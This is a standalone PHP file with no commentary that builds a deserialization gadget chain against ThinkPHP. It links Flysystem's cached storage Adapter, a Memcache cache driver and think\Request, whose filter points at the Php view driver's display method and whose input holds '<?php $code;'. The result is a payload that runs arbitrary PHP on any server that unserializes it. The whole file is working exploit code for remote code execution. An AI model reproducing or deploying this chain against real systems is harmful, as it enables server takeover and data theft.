<?php

namespace League\Flysystem\Cached\Storage {
    abstract class AbstractCache {
        protected $autosave = false;
    }

    class Adapter extends AbstractCache {
        protected $adapter;
        protected $file = "";

        public function __construct($code)
        {
            $this->adapter = new \think\cache\driver\Memcache($code);
        }
    }
}

namespace think\cache {
    abstract class Driver {
        protected $handler = null;
        protected $options = [
            "prefix" => ""
        ];
        
        public function __construct($code)
        {
            $this->handler = new \think\Request($code);
        }
    }
}

namespace think\cache\driver {
    class Memcache extends \think\cache\Driver {
        public function __construct($code)
        {
            parent::__construct($code);
        }
    }
}

namespace think {
    class Request {
        protected $get;
        protected $filter;

        public function __construct($code) {
            $this->filter = [
                0 => [new \think\view\driver\Php, "display"],
            ];
            $this->get = ["<?php $code;"];
        }
    }
}

namespace think\view\driver {
    class Php {
        public function __construct(){}
    }
}